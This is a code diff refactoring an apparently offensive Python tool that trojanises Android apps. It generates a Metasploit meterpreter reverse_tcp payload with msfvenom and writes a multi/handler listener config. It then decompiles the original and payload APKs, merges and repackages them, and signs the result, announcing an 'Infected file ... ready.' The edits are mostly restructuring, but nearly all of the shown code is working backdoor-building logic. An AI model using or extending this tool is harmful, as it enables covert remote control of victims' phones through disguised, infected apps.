@@ -80,17 +80,10 @@ def generate_meterpreter(command):
         sys.exit(1)
 
 def start_meterpreter_handler():
-    # TODO option take local ip or given ip?
-    # TODO make inrerface dynamic
-    #command = "ifconfig wlan0 | grep \"inet \" | awk -F'[: ]+' '{ print $4 }'"
-    #proc = subprocess.Popen(command, stdout=subprocess.PIPE,shell=True)
-    #(localip, err) = proc.communicate()
-    localip = args['meterpreter_ip']
-    print "[*] Start the handler for meterpreter on IP: " + str(localip) + " Port: " + args['meterpreter_port']
     with open("meterpreter_options.txt", "w") as f:
         f.write("use exploit/multi/handler\n")
         f.write("set payload android/meterpreter/reverse_tcp\n")
-        f.write("set lhost " + str(localip) + "\n")
+        f.write("set lhost " + args['meterpreter_ip'] + "\n")
         f.write("set lport " + args['meterpreter_port'] + "\n")
         f.write("exploit\n")
     
@@ -109,13 +102,11 @@ def run_jarsigner(command):
     print out
     print err
 
-
-def main():
+def check_requirements():
+    """
+    Check for all requirements (Software, Parameters)
+    """
     global args
-
-    parseArgs()
-    print args
-
     # check for used programs
     if args['metasploit_used']:
         if not isInstalled("msfvenom"):
@@ -136,9 +127,17 @@ def main():
         print "Please specify the path to the original apk with the -o parameter"
         sys.exit(1)
 
+def main():
+    global args
+
+    parseArgs()
+    print args
+
+    check_requirements()
+
     print "[*] Generating msfvenom payload..\n"
-    print "Metasploit command: msfvenom -f raw {} -o payload.apk 2>&1\n" \
-        .format(args['meterpreter_arguments'])
+#    print "Metasploit command: msfvenom -f raw {} -o payload.apk 2>&1\n" \
+#        .format(args['meterpreter_arguments'])
 
     command = "msfvenom " + args['meterpreter_arguments'] + " 2>&1"
     print str(command)
@@ -149,16 +148,17 @@ def main():
     run_jarsigner(
         "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey")
 
-    print "[*] Copy apk to desired place..\n"
+    #print "[*] Copy apk to desired place..\n"
     proc = subprocess.Popen("cp " + args['original_apk'] + " original.apk", stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
-    print out
+    #print out
 
     print "[*] Decompiling orignal APK..\n"
     builder.decompileApk("original.apk")
     print "[*] Decompiling payload APK..\n"
     builder.decompileApk("payload.apk")
-
+    #_____________________________________________________________________________________________#
+    # TODO Moritz: Structure this section; Include other hooks
     # read the manifest to xml model
     print "Reading android manifest"
 
@@ -188,6 +188,7 @@ def main():
     builder.repackApk("original/_decompiled/")
     print "[*] Signing #{injected_apk} ..\n"
 
+    #_____________________________________________________________________________________________#
     run_jarsigner(
         "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg "
         "MD5withRSA " + injected_apk + " androiddebugkey")
@@ -197,8 +198,8 @@ def main():
     #shutil.rmtree('original/')
     ##shutil.rmtree('payload/')
 
-    os.remove("original.apk")
-    os.remove("payload.apk")
+    #os.remove("original.apk")
+    #os.remove("payload.apk")
     print "[+] Infected file " + injected_apk + " ready.\n"
 
      
